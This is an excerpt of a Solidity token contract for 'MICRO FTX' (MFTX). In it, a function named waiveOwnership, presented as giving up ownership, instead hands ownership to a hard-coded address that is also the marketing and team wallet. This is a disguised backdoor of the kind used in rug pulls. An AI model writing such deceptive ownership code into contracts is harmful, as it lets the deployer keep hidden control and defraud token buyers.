...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x90eb91fB78B7e989D689ACB17c93fbC944E869c2);
    }
...
contract MICROFTX is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MICRO FTX";
    string private _symbol = "MFTX";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x90eb91fB78B7e989D689ACB17c93fbC944E869c2);
    address payable public teamWalletAddress = payable(0x90eb91fB78B7e989D689ACB17c93fbC944E869c2);
